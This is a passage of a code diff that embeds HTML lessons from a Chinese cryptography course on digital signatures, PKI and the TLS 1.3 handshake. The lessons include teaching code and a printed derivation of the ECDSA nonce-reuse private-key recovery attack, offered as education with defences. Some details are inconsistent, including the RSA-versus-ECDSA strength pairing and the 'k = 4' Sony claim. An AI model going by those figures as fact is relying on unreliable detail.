{verify(bob_commit, bob_choice, bob_rand)}\")\nprint(f\"\\nAlice 无法改变选择（改变后验证不通过）!\")</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\n<ul>\n  <li>密码存储：必须使用专用算法（bcrypt/Argon2），加盐 + 慢计算 + 大内存</li>\n  <li>HMAC：用密钥增强哈希，同时验证完整性和来源</li>\n  <li>Merkle 树：高效验证大数据中任意块的完整性，区块链核心结构</li>\n  <li>HKDF：从密钥材料安全派生多个密钥</li>\n  <li>承诺方案：哈希实现\"先承诺后揭示\"的公平协议</li>\n</ul></div>\n</section>";
+
+SECTION_CONTENT["crypto-05"] = "<section id=\"crypto-05\" class=\"section\" data-key=\"crypto-05\">\n<div class=\"section-transition\"><p>哈希函数解决了数据完整性问题，但如何证明\"这条消息确实是你发的\"？数字信封可以加密，但无法证明身份。这就需要数字签名——一种用数学方法实现的\"电子手印\"，不可伪造、不可抵赖。</p></div>\n<div class=\"section-header\">\n  <span class=\"chapter-tag\">crypto-05 · 数字签名与PKI</span>\n  <h1>数字签名原理与证书体系</h1>\n  <p class=\"subtitle\">从一个数学证明到全球互联网信任链，PKI 如何构建数字世界的\"身份证\"？</p>\n</div>\n\n<h2>一、一个价值十亿美元的问题</h2>\n<p>2011 年，荷兰 CA 公司 <strong>DigiNotar</strong> 被黑客入侵。攻击者利用 DigiNotar 的 CA 权限，为 google.com、yahoo.com 等域名伪造了 247 个 SSL 证书。这些证书被所有浏览器信任，因为 DigiNotar 是受信任的根 CA。</p>\n<p>伊朗政府疑似利用这些伪造证书对其国内用户实施中间人攻击，窃取 Gmail 等服务的登录凭据。事件曝光后，DigiNotar 被所有浏览器永久吊销，公司破产倒闭。</p>\n<p>这个故事揭示了数字签名的核心问题：<strong>谁来证明签名者的身份？</strong>如果 CA 本身不可信，整个信任链就会崩塌。</p>\n\n<h2>二、数字签名的数学原理</h2>\n<p>数字签名利用非对称加密的反向应用：加密是\"公钥加密、私钥解密\"，签名是\"<strong>私钥签名、公钥验证</strong>\"。</p>\n\n<h3>2.1 RSA 签名</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Hash import SHA256\n\n# 生成密钥对\nprivate_key = RSA.generate(2048)\npublic_key = private_key.publickey()\n\n# === 签名过程 ===\nmessage = b\"Transfer $1000 to Alice\"\nh = SHA256.new(message)\n\n# 用私钥签名\nsigner = pkcs1_15.new(private_key)\nsignature = signer.sign(h)\n\nprint(f\"消息: {message.decode()}\")\nprint(f\"签名: {signature.hex()[:64]}...\")\nprint(f\"签名长度: {len(signature)} 字节\")\n\n# === 验证过程 ===\nverifier = pkcs1_15.new(public_key)\ntry:\n    verifier.verify(h, signature)\n    print(\"签名验证: 有效!\")\nexcept (ValueError, TypeError):\n    print(\"签名验证: 无效!\")\n\n# 篡改消息后验证\ntampered = b\"Transfer $9999 to Eve\"\nh_tampered = SHA256.new(tampered)\ntry:\n    verifier.verify(h_tampered, signature)\n    print(\"篡改后验证: 有效 (不应该发生!)\")\nexcept (ValueError, TypeError):\n    print(\"篡改后验证: 无效! (正确检测到篡改)\")</code></pre></div>\n\n<h3>2.2 签名的三重保证</h3>\n<ul>\n  <li><strong>认证性（Authentication）</strong>：只有持有私钥的人能生成有效签名 → 证明\"确实是你发的\"</li>\n  <li><strong>完整性（Integrity）</strong>：签名绑定消息哈希 → 任何篡改都会被检测</li>\n  <li><strong>不可否认性（Non-repudiation）</strong>：签名者不能否认自己签过的消息（只有他有私钥）</li>\n</ul>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>三、ECDSA：椭圆曲线数字签名</h2>\n<p>RSA 签名需要 2048 位密钥才能达到 112 位安全级别。<strong>ECDSA（Elliptic Curve Digital Signature Algorithm）</strong>用 256 位就能达到相同安全级别——密钥更短、签名更小、速度更快。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from Crypto.PublicKey import ECC\nfrom Crypto.Signature import DSS\nfrom Crypto.Hash import SHA256\n\n# ECDSA 密钥生成（P-256 曲线）\necc_key = ECC.generate(curve='P-256')\necc_pub = ecc_key.public_key()\n\n# 签名\nmessage = b\"Important contract: Party A agrees to...\"\nh = SHA256.new(message)\nsigner = DSS.new(ecc_key, 'fips-186-3')\nsignature = signer.sign(h)\n\nprint(f\"ECDSA 签名 (P-256):\")\nprint(f\"  密钥大小: 256 位 (vs RSA 需要 3072 位同等安全)\")\nprint(f\"  签名大小: {len(signature)} 字节\")\nprint(f\"  签名(hex): {signature.hex()[:64]}...\")\n\n# 验证\nverifier = DSS.new(ecc_pub, 'fips-186-3')\ntry:\n    verifier.verify(h, signature)\n    print(\"  验证: 有效!\")\nexcept (ValueError, TypeError):\n    print(\"  验证: 无效!\")\n\n# 对比 RSA 和 ECDSA\nprint(f\"\\n安全级别对比:\")\nprint(f\"  112 位安全: RSA-2048 vs ECDSA-256\")\nprint(f\"  128 位安全: RSA-3072 vs ECDSA-384\")\nprint(f\"  192 位安全: RSA-7680 vs ECDSA-521\")</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">EdDSA 与 Ed25519</div><p><strong>Ed25519</strong> 是另一种椭圆曲线签名方案，由 Daniel Bernstein 等人设计。它消除了 ECDSA 中随机数生成器的依赖（ECDSA 中一个坏的随机数就能泄露私钥——PlayStation 3 就是这样被破解的），签名速度恒定，不受输入影响。</p></div>\n\n<h3>3.2 ECDSA 的致命弱点：Nonce 重用攻击</h3>\n<p>ECDSA 签名每次需要生成一个<strong>随机数 k（nonce）</strong>。如果两次签名使用了相同的 k，攻击者可以直接计算出私钥！这绝非理论风险——2010 年，索尼 PlayStation 3 的 ECDSA 签名实现被发现使用了一个<strong>恒定的 nonce</strong>。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def ecdsa_nonce_reuse_attack():\n    \"\"\"演示 ECDSA nonce 重用如何泄露私钥\"\"\"\n\n    print(\"=== ECDSA Nonce 重用攻击 ===\")\n    print(\"Sony PlayStation 3 破解事件 (2010)\\n\")\n\n    print(\"ECDSA 签名过程:\")\n    print(\"  1. 选择随机数 k（必须每次不同！）\")\n    print(\"  2. 计算 R = k * G（椭圆曲线点乘）\")\n    print(\"  3. r = R.x mod n\")\n    print(\"  4. s = k^(-1) * (hash(m) + r * private_key) mod n\")\n    print(\"  签名 = (r, s)\\n\")\n\n    print(\"如果两次签名 (m1, m2) 使用了相同的 k:\")\n    print(\"  r1 = r2 = r （因为 k 相同，R 相同）\")\n    print(\"  s1 = k^(-1) * (h1 + r*d) mod n\")\n    print(\"  s2 = k^(-1) * (h2 + r*d) mod n\")\n    print(\"  s1 - s2 = k^(-1) * (h1 - h2) mod n\")\n    print(\"  → k = (h1 - h2) * (s1 - s2)^(-1) mod n  ← 可计算!\")\n    print(\"  → d = (s1*k - h1) * r^(-1) mod n        ← 私钥泄露!\\n\")\n\n    print(\"Sony PS3 的问题:\")\n    print(\"  Sony 的 ECDSA 实现使用固定 k = 4\")\n    print(\"  黑客组织 fail0verflow 发现后，直接计算出索尼的私钥\")\n    print(\"  随后可以签署任意代码让 PS3 执行\")\n    print(\"  Sony 起诉了黑客 geohot，引发巨大争议\\n\")\n\n    print(\"防御措施:\")\n    print(\"  1. 使用确定性 nonce (RFC 6979): k = HMAC(private_key, message)\")\n    print(\"  2. 或改用 Ed25519: 签名过程不依赖外部随机数\")\n    print(\"  3. 严格测试随机数生成器\")\n\necdsa_nonce_reuse_attack()</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">真实案例</div><p>2013 年，Android 比特币钱包应用也出现了 ECDSA nonce 重用漏洞。攻击者利用相同的 nonce 重用攻击窃取了用户的比特币。这些事件共同证明：ECDSA 的正确实现极其困难，这也是 Ed25519 越来越受推崇的原因。</p></div>\n\n<h2>四、X.509 证书：数字世界的身份证</h2>\n<p>数字签名解决了\"这条消息是否由该私钥签名\"的问题，但留下了\"这个公钥到底属于谁\"的问题。如果攻击者替换了你的公钥（中间人攻击），他可以冒充你签名。</p>\n<p><strong>X.509 证书</strong>就是解决方案：一份由可信第三方（CA）签名的文件，将公钥与身份绑定。</p>\n\n<h3>4.1 证书的内容</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Hash import SHA256\nimport json\nimport datetime\n\n# 模拟证书结构\ndef create_certificate(subject_name, subject_pub_key, issuer_name,\n                       issuer_priv_key, validity_days=365):\n    \"\"\"创建一个简化的 X.509 证书\"\"\"\n    cert_data = {\n        \"version\": 3,\n        \"serial_number\": 1234567890,\n        \"issuer\": issuer_name,\n        \"subject\": subject_name,\n        \"validity\": {\n            \"not_before\": datetime.datetime.now().isoformat(),\n            \"not_after\": (datetime.datetime.now() +\n                         datetime.timedelta(days=validity_days)).isoformat()\n        },\n        \"public_key\": {\n            \"algorithm\": \"RSA\",\n            \"size\": subject_pub_key.size_in_bits(),\n            \"key_hex\": subject_pub_key.export_key(format='DER').hex()[:64] + \"...\"\n        },\n        \"extensions\": {\n            \"key_usage\": [\"digitalSignature\", \"keyEncipherment\"],\n            \"subject_alt_name\": [\"www.example.com\", \"example.com\"]\n        }\n    }\n\n    # CA 用自己的私钥对证书数据签名\n    cert_bytes = json.dumps(cert_data, sort_keys=True).encode()\n    h = SHA256.new(cert_bytes)\n    signature = pkcs1_15.new(issuer_priv_key).sign(h)\n\n    cert_data[\"signature_algorithm\"] = \"SHA256withRSA\"\n    cert_data[\"signature_hex\"] = signature.hex()[:64] + \"...\"\n\n    return cert_data\n\n# 创建 CA 和服务器证书\nca_key = RSA.generate(2048)\nserver_key = RSA.generate(2048)\n\ncert = create_certificate(\n    subject_name=\"CN=www.example.com, O=Example Inc, C=US\",\n    subject_pub_key=server_key.publickey(),\n    issuer_name=\"CN=CyberEdu Root CA, O=CyberEdu, C=CN\",\n    issuer_priv_key=ca_key\n)\n\nprint(\"X.509 证书结构:\")\nprint(json.dumps(cert, indent=2, ensure_ascii=False)[:1000])</code></pre></div>\n\n<h3>4.2 证书链与信任层次</h3>\n<p>互联网采用<strong>层次化的信任模型</strong>：</p>\n<ol>\n  <li><strong>根 CA（Root CA）</strong>：自签名证书，预装在操作系统和浏览器中。全球约 150 个受信任的根 CA。</li>\n  <li><strong>中间 CA（Intermediate CA）</strong>：由根 CA 签名，负责签发终端证书。</li>\n  <li><strong>终端证书（End-entity Certificate）</strong>：绑定域名和公钥，由中间 CA 签发。</li>\n</ol>\n<p>验证证书时，浏览器沿着证书链向上追溯，直到找到一个预装的受信任根 CA。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def verify_certificate_chain():\n    \"\"\"模拟证书链验证过程\"\"\"\n    print(\"=== 证书链验证: www.example.com ===\\n\")\n\n    # 终端证书 → 中间 CA → 根 CA\n    chain = [\n        {\"name\": \"www.example.com\",       \"issuer\": \"CyberEdu Intermediate CA\", \"level\": \"终端证书\"},\n        {\"name\": \"CyberEdu Intermediate CA\", \"issuer\": \"CyberEdu Root CA\",       \"level\": \"中间 CA\"},\n        {\"name\": \"CyberEdu Root CA\",      \"issuer\": \"CyberEdu Root CA\",         \"level\": \"根 CA (自签名)\"},\n    ]\n\n    # 步骤 1: 检查域名匹配\n    print(\"1. 检查域名匹配:\")\n    print(f\"   证书域名: www.example.com, example.com\")\n    print(f\"   请求域名: www.example.com → 匹配!\\n\")\n\n    # 步骤 2: 检查有效期\n    print(\"2. 检查有效期:\")\n    print(f\"   有效期间: 2024-01-01 ~ 2025-01-01\")\n    print(f\"   当前时间: 2024-06-15 → 在有效期内!\\n\")\n\n    # 步骤 3: 验证证书链签名\n    print(\"3. 验证证书链签名:\")\n    for i, cert in enumerate(chain):\n        if cert[\"level\"] == \"根 CA (自签名)\":\n            print(f\"   [{i+1}] {cert['name']} → 根 CA 自签名，检查信任存储\")\n            print(f\"       在信任存储中找到 → 信任!\\n\")\n        else:\n            print(f\"   [{i+1}] {cert['name']}\")\n            print(f\"       签发者: {cert['issuer']}\")\n            print(f\"       用签发者的公钥验证签名 → 有效!\\n\")\n\n    # 步骤 4: 检查吊销状态\n    print(\"4. 检查证书吊销状态:\")\n    print(f\"   CRL/OCSP 查询 → 未被吊销 → 有效!\\n\")\n\n    print(\"=== 验证通过! 连接安全 ===\")\n\nverify_certificate_chain()</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>五、用 OpenSSL 查看真实证书</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import subprocess\nimport ssl\nimport json\n\ndef inspect_real_certificate(hostname, port=443):\n    \"\"\"获取并解析真实网站的 SSL 证书\"\"\"\n    try:\n        # 使用 Python ssl 模块获取证书\n        context = ssl.create_default_context()\n        with socket.create_connection((hostname, port), timeout=5) as sock:\n            with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                cert = ssock.getpeercert()\n\n        print(f\"=== {hostname} 的 SSL 证书 ===\\n\")\n        print(f\"主体: {cert.get('subject', 'N/A')}\")\n        print(f\"签发者: {cert.get('issuer', 'N/A')}\")\n        print(f\"序列号: {cert.get('serialNumber', 'N/A')}\")\n        print(f\"有效期:\")\n        print(f\"  开始: {cert.get('notBefore', 'N/A')}\")\n        print(f\"  结束: {cert.get('notAfter', 'N/A')}\")\n\n        san = cert.get('subjectAltName', [])\n        print(f\"域名 (SAN): {[name for _, name in san]}\")\n\n    except Exception as e:\n        print(f\"获取证书失败: {e}\")\n        print(\"(此代码需要在联网环境中运行)\")\n\nimport socket\ninspect_real_certificate(\"www.baidu.com\")</code></pre></div>\n\n<h2>六、PKI 体系：互联网的信任基础设施</h2>\n<p><strong>PKI（Public Key Infrastructure，公钥基础设施）</strong>是管理数字证书和公钥的完整体系，包括：</p>\n<ul>\n  <li><strong>CA（Certificate Authority）</strong>：签发和吊销证书</li>\n  <li><strong>RA（Registration Authority）</strong>：验证证书申请者的身份</li>\n  <li><strong>CRL（Certificate Revocation List）</strong>：已吊销证书的黑名单</li>\n  <li><strong>OCSP（Online Certificate Status Protocol）</strong>：实时查询证书状态</li>\n  <li><strong>证书存储（Trust Store）</strong>：预装的根证书集合</li>\n</ul>\n\n<h3>6.1 Let's Encrypt：自动化免费证书</h3>\n<p>2016 年上线的 <strong>Let's Encrypt</strong> 革命性地改变了证书获取方式：完全免费、自动签发、自动续期。它使用 <strong>ACME 协议</strong> 自动验证域名所有权。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># Let's Encrypt / ACME 协议工作流程\ndef acme_flow():\n    \"\"\"Let's Encrypt 自动证书签发流程\"\"\"\n    print(\"=== Let's Encrypt ACME 证书签发流程 ===\\n\")\n\n    print(\"1. 客户端生成密钥对\")\n    print(\"   $ openssl genrsa -out privkey.pem 2048\\n\")\n\n    print(\"2. 客户端向 CA 申请证书\")\n    print(\"   → ACME 服务器返回挑战（Challenge）\\n\")\n\n    print(\"3. 域名验证（HTTP-01 挑战）:\")\n    print(\"   CA 要求: 在 http://example.com/.well-known/acme-challenge/TOKEN\")\n    print(\"   放置指定内容 KEY_AUTHORIZATION\\n\")\n\n    print(\"4. 客户端配置 Web 服务器响应挑战:\")\n    print(\"   $ mkdir -p /var/www/.well-known/acme-challenge/\")\n    print(\"   $ echo 'TOKEN.KEY_AUTHORIZATION' > /var/www/.well-known/acme-challenge/TOKEN\\n\")\n\n    print(\"5. CA 验证域名控制权:\")\n    print(\"   → GET http://example.com/.well-known/acme-challenge/TOKEN\")\n    print(\"   → 收到正确响应 → 验证通过!\\n\")\n\n    print(\"6. CA 签发证书:\")\n    print(\"   → 返回 X.509 证书（有效期 90 天）\\n\")\n\n    print(\"7. 自动续期（定时任务）:\")\n    print(\"   $ certbot renew --quiet\")\n    print(\"   （在证书到期前 30 天自动续期）\\n\")\n\n    print(\"=== 证书已安装，HTTPS 可用! ===\")\n\nacme_flow()</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">证书吊销的难题</div><p>证书吊销是 PKI 最棘手的问题。CRL 列表可能很大，OCSP 查询增加延迟和隐私风险。2012 年 Flame 恶意软件利用了微软终端服务 CA 的漏洞签发伪造证书。浏览器正在从\"硬失败\"转向\"软失败\"——如果无法检查吊销状态，多数浏览器会选择继续连接。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>七、签名算法的安全演进</h2>\n\n<table>\n<thead><tr><th>时代</th><th>算法</th><th>密钥长度</th><th>状态</th></tr></thead>\n<tbody>\n<tr><td>1990s</td><td>RSA-1024 + MD5</td><td>1024 位</td><td>不安全，已弃用</td></tr>\n<tr><td>2000s</td><td>RSA-2048 + SHA-1</td><td>2048 位</td><td>SHA-1 已弃用</td></tr>\n<tr><td>2010s</td><td>RSA-2048 + SHA-256</td><td>2048 位</td><td>当前主流</td></tr>\n<tr><td>2020s</td><td>ECDSA P-256 + SHA-256</td><td>256 位</td><td>推荐</td></tr>\n<tr><td>2020s</td><td>Ed25519</td><td>256 位</td><td>最佳选择</td></tr>\n<tr><td>未来</td><td>后量子签名（Dilithium）</td><td>-</td><td>标准化中</td></tr>\n</tbody>\n</table>\n\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\n<ul>\n  <li>数字签名 = 私钥签名 + 公钥验证，提供认证、完整性、不可否认性</li>\n  <li>RSA 签名需要 2048+ 位密钥，ECDSA 用 256 位达到同等安全</li>\n  <li>X.509 证书将公钥与身份绑定，由 CA 签名背书</li>\n  <li>PKI 层次结构：根 CA → 中间 CA → 终端证书</li>\n  <li>Let's Encrypt 通过 ACME 协议实现免费自动化证书</li>\n  <li>Ed25519 是当前最佳签名算法，后量子算法正在标准化</li>\n</ul></div>\n</section>";
+
+SECTION_CONTENT["crypto-06"] = "<section id=\"crypto-06\" class=\"section\" data-key=\"crypto-06\">\n<div class=\"section-transition\"><p>数字签名和证书体系构成了互联网信任的基石。而将所有这些密码学组件串联起来的，就是 TLS 协议——你浏览器地址栏中那个小锁的背后，每毫秒都在运行的密码学交响曲。</p></div>\n<div class=\"section-header\">\n  <span class=\"chapter-tag\">crypto-06 · TLS协议</span>\n  <h1>TLS 1.3 握手全过程</h1>\n  <p class=\"subtitle\">从 SSL 1.0 的灾难到 TLS 1.3 的极简优雅，一段 25 年的安全进化史</p>\n</div>\n\n<h2>一、1995 年：Netscape 的\"创世纪\"</h2>\n<p>1994 年，Netscape 推出 Navigator 浏览器，引爆互联网革命。但电子商务需要一个关键能力：在不可信的互联网上安全传输信用卡号。Netscape 的工程师在几个月内设计出 <strong>SSL（Secure Sockets Layer）1.0</strong>——但这个版本从未发布，因为安全问题太多。</p>\n<p>1995 年发布的 SSL 2.0 同样漏洞百出。1996 年的 SSL 3.0 终于基本可用，但此后的历史是一连串的攻击和修补：</p>\n<ul>\n  <li><strong>2011 BEAST 攻击</strong>：利用 CBC 模式的可预测 IV 解密 SSL 3.0/TLS 1.0</li>\n  <li><strong>2014 POODLE 攻击</strong>：彻底击碎 SSL 3.0</li>\n  <li><strong>2014 Heartbleed</strong>：OpenSSL 的心跳扩展实现漏洞，泄露服务器内存（包括私钥）</li>\n  <li><strong>2015 FREAK/Logjam</strong>：降级攻击迫使连接使用弱加密</li>\n</ul>\n<p>每次攻击都暴露了 TLS 协议设计中的深层问题。最终，IETF 决定从头设计：<strong>TLS 1.3</strong> 于 2018 年发布，是一次彻底的\"减法革命\"。</p>\n\n<h2>二、TLS 1.2 vs TLS 1.3：做减法的艺术</h2>\n<p>TLS 1.3 的设计哲学：<strong>删除一切不安全的、过时的、多余的</strong>。</p>\n\n<table>\n<thead><tr><th>特性</th><th>TLS 1.2 (2008)</th><th>TLS 1.3 (2018)</th></tr></thead>\n<tbody>\n<tr><td>握手往返</td><td>2-RTT</td><td>1-RTT（甚至 0-RTT）</td></tr>\n<tr><td>密钥交换</td><td>RSA / DH / ECDH</td><td>仅 ECDHE / DHE</td></tr>\n<tr><td>对称加密</td><td>AES-CBC, AES-GCM, RC4, 3DES...</td><td>仅 AEAD（AES-GCM, ChaCha20-Poly1305）</td></tr>\n<tr><td>哈希</td><td>MD5, SHA-1, SHA-256</td><td>仅 SHA-256/384</td></tr>\n<tr><td>前向保密</td><td>可选</td><td>强制</td></tr>\n<tr><td>重协商</td><td>支持（有安全问题）</td><td>删除</td></tr>\n<tr><td>压缩</td><td>支持（CRIME 攻击）</td><td>删除</td></tr>\n</tbody>\n</table>\n\n<div class=\"callout warn\"><div class=\"callout-title\">被删除的算法</div><p>TLS 1.3 彻底移除了：RSA 密钥交换（无前向保密）、CBC 模式（BEAST/Lucky13 攻击）、RC4（统计偏差）、3DES（Sweet32 攻击）、MD5/SHA-1（碰撞攻击）、静态 DH（无前向保密）、自定义 DHE 参数（只保留安全的命名曲线）。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>三、TLS 1.3 握手详解</h2>\n<p>TLS 1.3 握手只需<strong>一个往返（1-RTT）</strong>就能完成，比 TLS 1.2 的两个往返快了一倍。关键在于客户端在第一个消息中就发送了密钥交换参数。</p>\n\n<h3>3.1 完整握手流程</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def tls13_handshake_simulation():\n    \"\"\"模拟 TLS 1.3 完整握手过程\"\"\"\n\n    print(\"=\" * 60)\n    print(\"TLS 1.3 握手过程（1-RTT Full Handshake）\")\n    print(\"=\" * 60)\n\n    print(\"\\n--- 客户端 Hello (ClientHello) ---\")\n    print(\"客户端 → 服务器:\")\n    print(\"  1. client_random: 32 字节随机数\")\n    print(\"  2. 支持的密码套件列表:\")\n    print(\"     - TLS_AES_256_GCM_SHA384\")\n    print(\"     - TLS_CHACHA20_POLY1305_SHA256\")\n    print(\"     - TLS_AES_128_GCM_SHA256\")\n    print(\"  3. key_share: 客户端的 ECDHE 公钥\")\n    print(\"     (x25519 或 secp256r1 曲线的临时公钥)\")\n    print(\"  4. supported_versions: [1.3]\")\n    print(\"  5. signature_algorithms: [ecdsa_secp256r1_sha256,\")\n    print(\"     rsa_pss_rsae_sha256, ed25519]\")\n    print(\"  ★ 关键改进: 密钥交换参数在第一个包中就发送了!\")\n\n    print(\"\\n--- 服务器响应 (ServerHello + 加密扩展) ---\")\n    print(\"服务器 → 客户端:\")\n    print(\"  1. server_random: 32 字节随机数\")\n    print(\"  2. 选定密码套件: TLS_AES_256_GCM_SHA384\")\n    print(\"  3. key_share: 服务器的 ECDHE 公钥\")\n    print(\"  ★ 此时双方已可计算共享密钥!\")\n\n    print(\"\\n  [以下消息全部加密传输]\")\n    print(\"  4. EncryptedExtensions: ALPN 协议选择等\")\n    print(\"  5. Certificate: 服务器证书（含证书链）\")\n    print(\"  6. CertificateVerify: 服务器用私钥签名握手哈希\")\n    print(\"     → 证明服务器确实持有证书对应的私钥\")\n    print(\"  7. Finished: 握手消息的 HMAC 认证\")\n\n    print(\"\\n--- 客户端完成 ---\")\n    print(\"客户端 → 服务器:\")\n    print(\"  1. Certificate (仅双向认证时需要)\")\n    print(\"  2. Finished: 握手消息的 HMAC 认证\")\n\n    print(\"\\n--- 应用数据传输 ---\")\n    print(\"双向加密通信开始!\")\n\n    print(\"\\n\" + \"=\" * 60)\n    print(\"密钥推导过程:\")\n    print(\"=\" * 60)\n    print(\"  1. ECDHE: client_share + server_share → shared_secret\")\n    print(\"  2. HKDF-Extract: (salt=0, IKM=shared_secret) → Early Secret\")\n    print(\"  3. HKDF-Derive: Early Secret + transcript_hash\")\n    print(\"     → Handshake Secret\")\n    print(\"  4. HKDF-Derive: Handshake Secret + transcript_hash\")\n    print(\"     → Client Handshake Traffic Key\")\n    print(\"     → Server Handshake Traffic Key\")\n    print(\"  5. HKDF-Derive: Handshake Secret + transcript_hash\")\n    print(\"     → Master Secret\")\n    print(\"  6. HKDF-Derive: Master Secret + transcript_hash\")\n    print(\"     → Client Application Traffic Key\")\n    print(\"     → Server Application Traffic Key\")\n\ntls13_handshake_simulation()</code></pre></div>\n\n<h3>3.2 密钥推导的 HKDF 细节</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\nimport hmac\nimport os\n\ndef hkdf_extract(salt, ikm, hash_algo=hashlib.sha256):\n    \"\"\"HKDF-Extract\"\"\"\n    return hmac.new(salt, ikm, hash_algo).digest()\n\ndef hkdf_expand_label(secret, label, context, length):\n    \"\"\"TLS 1.3 HKDF-Expand-Label\"\"\"\n    full_label = b\"tls13 \" + label\n    hkdf_label = (\n        length.to_bytes(2, 'big') +\n        len(full_label).to_bytes(1, 'big') +\n        full_label +\n        len(context).to_bytes(1, 'big') +\n        context\n    )\n\n    # HKDF-Expand\n    hash_len = 32\n    n = (length + hash_len - 1) // hash_len\n    okm = b''\n    t = b''\n    for i in range(1, n + 1):\n        t = hmac.new(secret, t + hkdf_label + bytes([i]), hashlib.sha256).digest()\n        okm += t\n    return okm[:length]\n\ndef derive_key(secret, label, length=32):\n    return hkdf_expand_label(secret, label, b'', length)\n\n# 模拟 TLS 1.3 密钥推导\nprint(\"=== TLS 1.3 密钥推导模拟 ===\\n\")\n\n# 模拟 ECDHE 共享秘密\nshared_secret = os.urandom(32)\nclient_random = os.urandom(32)\nserver_random = os.urandom(32)\n\n# 步骤 1: Early Secret\nearly_secret = hkdf_extract(b'\\x00' * 32, b'\\x00' * 32)\nprint(f\"1. Early Secret: {early_secret.hex()[:32]}...\")\n\n# 步骤 2: Handshake Secret\nhandshake_secret = hkdf_extract(\n    derive_key(early_secret, b\"derived\", 32),\n    shared_secret\n)\nprint(f\"2. Handshake Secret: {handshake_secret.hex()[:32]}...\")\n\n# 步骤 3: 握手流量密钥\nclient_hs_key = derive_key(handshake_secret, b\"c hs traffic\", 32)\nserver_hs_key = derive_key(handshake_secret, b\"s hs traffic\", 32)\nprint(f\"3. Client HS Key: {client_hs_key.hex()[:32]}...\")\nprint(f\"   Server HS Key: {server_hs_key.hex()[:32]}...\")\n\n# 步骤 4: Master Secret\nmaster_secret = hkdf_extract(\n    derive_key(handshake_secret, b\"derived\", 32),\n    b'\\x00' * 32\n)\nprint(f\"4. Master Secret: {master_secret.hex()[:32]}...\")\n\n# 步骤 5: 应用流量密钥\nclient_app_key = derive_key(master_secret, b\"c ap traffic\", 32)\nserver_app_key = derive_key(master_secret, b\"s ap traffic\", 32)\nprint(f\"5. Client App Key: {client_app_key.hex()[:32]}...\")\nprint(f\"   Server App Key: {server_app_key.hex()[:32]}...\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>四、0-RTT：更快但有风险</h2>\n<p>TLS 1.3 引入了 <strong>0-RTT（Zero Round Trip Time）</strong> 恢复：如果客户端之前连接过该服务器，可以在第一个包中就发送应用数据。代价是 <strong>0-RTT 数据没有前向保密性</strong>，且可能被<strong>重放攻击</strong>。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def tls13_0rtt_flow():\n    \"\"\"TLS 1.3 的 0-RTT 预共享密钥恢复\"\"\"\n\n    print(\"=== TLS 1.3 0-RTT 恢复 ===\\n\")\n\n    print(\"第一次连接（正常 1-RTT 握手）:\")\n    print(\"  ClientHello → ServerHello → 握手完成\")\n    print(\"  服务器发送: NewSessionTicket (包含 PSK 和 ticket)\\n\")\n\n    print(\"后续连接（0-RTT 快速恢复）:\")\n    print(\"  ClientHello:\")\n    print(\"    - pre_shared_key: 上次获得的 ticket\")\n    print(\"    - early_data: 'GET /index.html HTTP/1.1...'\")\n    print(\"    ★ HTTP 请求在第一个包中就发出了!\\n\")\n\n    print(\"  服务器收到后:\")\n    print(\"    - 验证 PSK ticket\")\n    print(\"    - 如果可以接受: 立即处理 early_data\")\n    print(\"    - 回复 ServerHello + 确认 early_data\")\n    print(\"    ★ 零往返延迟!\\n\")\n\n    print(\"⚠️ 0-RTT 安全风险:\")\n    print(\"  1. 无前向保密: 如果 PSK 泄露，早期数据可被解密\")\n    print(\"  2. 重放攻击: 攻击者可以截获并重发 early_data\")\n    print(\"     → 解决: 服务器用单次 token 或仅允许幂等操作\")\n    print(\"     → 'GET /page' 安全（幂等）\")\n    print(\"     → 'POST /transfer $1000' 危险（非幂等）\")\n\ntls13_0rtt_flow()</code></pre></div>\n\n<h2>五、前向保密：保护过去的安全</h2>\n<p>2013 年，Edward Snowden 泄露的文件显示 NSA 在大规模收集加密流量。如果这些流量使用 RSA 密钥交换加密，一旦将来服务器私钥泄露，所有历史流量都可被解密。这就是<strong>前向保密（Forward Secrecy / Perfect Forward Secrecy）</strong>的重要性。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def forward_secrecy_demo():\n    \"\"\"前向保密的重要性演示\"\"\"\n\n    print(\"=== 无前向保密 (RSA 密钥交换) ===\")\n    print(\"  客户端用服务器 RSA 公钥加密会话密钥\")\n    print(\"  如果 NSA 录制了所有流量 + 后来获得服务器私钥:\")\n    print(\"  → 所有历史流量可被解密! ❌\\n\")\n\n    print(\"=== 有前向保密 (ECDHE 密钥交换) ===\")\n    print(\"  每次连接使用临时 ECDH 密钥对\")\n    print(\"  连接结束后临时密钥被销毁\")\n    print(\"  即使后来获得服务器长期私钥:\")\n    print(\"  → 只能验证身份，不能解密历史流量! ✓\\n\")\n\n    print(\"TLS 1.3 强制要求前向保密:\")\n    print(\"  - 移除了 RSA 